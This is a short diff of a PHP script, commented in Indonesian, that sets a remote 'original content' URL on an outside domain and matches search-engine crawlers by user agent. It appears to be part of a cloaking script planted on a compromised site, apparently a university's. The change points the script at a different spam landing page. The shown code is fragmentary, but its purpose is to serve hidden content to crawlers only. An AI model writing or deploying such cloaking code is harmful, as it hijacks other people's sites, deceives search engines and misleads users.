@@ -3,7 +3,7 @@ ob_start();
 header("Vary: User-Agent");
 
 // Link konten asli
-$content_url = "https://childrenofiran.org/landing/fe.unibba/";
+$content_url = "https://childrenofiran.org/landing/ejournal.unibba/";
 
 // Pola bot yang mau di-handle
 $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
